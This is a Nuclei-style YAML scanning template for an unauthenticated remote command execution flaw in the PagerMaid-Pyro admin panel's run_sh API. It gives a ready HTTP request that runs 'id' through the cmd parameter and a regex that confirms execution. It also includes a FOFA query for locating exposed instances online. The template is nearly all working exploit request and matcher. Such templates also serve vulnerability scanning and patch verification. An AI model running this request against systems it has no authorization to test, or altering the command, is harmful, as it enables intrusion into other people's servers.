id: pagermaid-pyro-run_sh-rce
info:
  name: PagerMaid-Pyro后台管理系统run_sh接口存在未授权命令执行漏洞
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/eeeeeeeeee-code/POC/blob/2668b8cec9d13c85910a1df09359d3bdcee6bab7/wpoc/PagerMaid-Pyro%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/PagerMaid-Pyro%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Frun_sh%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: title="PagerMaid-Pyro" && body="href=\"https://xtaolabs.com/pagermaid-logo.png\""
    tips:
    repair:
    version:
  tags: rce,pagermaid-pyro

http:
  - raw:
      - |
        GET /pagermaid/api/run_sh?cmd=id HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: application/json, text/plain, */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"

      - type: status
        status:
          - 200